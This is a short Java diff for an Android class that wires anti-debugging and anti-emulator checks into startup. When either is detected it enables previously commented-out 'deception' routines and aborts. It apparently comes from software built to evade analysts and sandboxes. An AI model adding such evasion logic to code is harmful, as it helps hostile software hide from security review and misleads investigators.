@@ -98,6 +98,14 @@ public class Core extends Activity implements Runnable {
 
 			return false;
 		}
+		
+		// ANTIDEBUG ANTIEMU
+		if(!check()){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (Start) anti emu/debug failed");
+			}
+			return false;
+		}
 
 		coreThread = new Thread(this);
 
@@ -744,18 +752,35 @@ public class Core extends Activity implements Runnable {
 		}
 	}
 
-	public static boolean check() {
+	public boolean check() {
 		if (!Cfg.DEBUG) {
 			AntiDebug ad = new AntiDebug();
 			if (ad.isDebug()) {
-				// deceptionCode1();
+				deceptionCode1();
 				return false;
 			}
 		}
 
 		AntiEmulator am = new AntiEmulator();
 		if (am.isEmu()) {
-			// deceptionCode2();
+			deceptionCode2();
+			return false;
+		}
+		return true;
+	}
+	
+	public static boolean checkStatic() {
+		if (!Cfg.DEBUG) {
+			AntiDebug ad = new AntiDebug();
+			if (ad.isDebug()) {
+				//deceptionCode1();
+				return false;
+			}
+		}
+
+		AntiEmulator am = new AntiEmulator();
+		if (am.isEmu()) {
+			//deceptionCode2();
 			return false;
 		}
 		return true;
